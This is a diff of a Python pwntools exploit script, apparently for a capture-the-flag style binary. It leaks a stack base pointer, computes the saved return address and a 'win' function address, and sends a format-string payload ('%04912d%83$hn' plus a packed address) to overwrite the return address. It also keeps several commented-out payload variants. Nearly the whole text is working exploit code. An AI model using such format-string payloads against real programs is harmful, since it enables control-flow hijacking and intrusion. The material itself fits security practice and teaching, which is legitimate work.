@@ -74,45 +74,18 @@ leaked_rbp = io.recvline(keepends=False)
 print(f"leaked rbp : {leaked_rbp}")
 rbp_main = int(leaked_rbp, 16)
 rbp_func = rbp_main - 80 # 80 = diff of rbp main and func
-print(f"leaked rbp_func : {hex(rbp_func)}")
-leaked_ret = rbp_func + 8
-rip_func = leaked_ret
-print(f"leaked rip_func : {hex(leaked_ret)}")
+print(f"leaked rbp_func : {rbp_func}")
+rip_func = rbp_func + 8
+print(f"leaked rip_func : {rip_func}")
 # print(hex(rip_func))
 
-ret = leaked_ret & 0x0ffff
-print(f"ret : {hex(ret)}")
-win_address = ret - 0x405
-# print(f"win_address : {hex(win_address)}")
-# bytes_to_write = win_address - 122 # 122 is length of leading input string
-# payload = b"%0" + p64(bytes_to_write) + b"d" + b"%83$lnAAAAAAAA"  + p64(leaked_ret) 
-# win_addr_val = rip_func - 0x1735 + 0x1330
-# bytes_to_write = win_addr_val - 122 # 122 is length of leading input string
-
-
-
+win_addr_val = rip_func - 0x1735 + 0x1330
+bytes_to_write = win_addr_val - 122 # 122 is length of leading input string
 # payload = b"%" + b"A"*bytes_to_write + b"%82$lnAAAAAAAA"  + p64(rip_func) 
 # payload = b"A"*6 + b"%0" + p64(bytes_to_write) + b"d" + b"%83$lnAAAAAAAA"  + p64(rip_func) 
-# payload = b'%04912d%83$hnA'+p64(rip_func)
-# # payload = b'%e330x%84$hnAA'+p64(rip_func)
-# payload = b'%{}%84$hnAA'+p64(rip_func)
-# print(payload)
-# io.recvuntil(b"triggering the vulnerability:")
-# payload = b'%d'%str(win_address).encode() + b'%83$hnA' + p64(rip_func)
-payload=b"%058038d%83$hn"+p64(rip_func)
+payload = b'A%04912d%83$hn'+p64(rip_func)
+print(payload)
 io.sendline(payload)
-
-io.recvuntil(b"triggering the vulnerability:")
-io.sendline(b"END")
-
-# exploit_rip = f"%199$p"
-# io.recvuntil(b"triggering the vulnerability:")
-# io.sendline(exploit_rip)
-# io.recvuntil(b"Your input is:")
-# io.recvline()
-# leaked_rip = io.recvline(keepends=False)
-# print(f"leaked_rip : {leaked_rip}")
-
 # print(f"win_addr : {win_addr}")
 # writes = {rip_func:win_addr}
 # payload = b'a'*6+fmtstr_payload(83, writes, numbwritten=128)
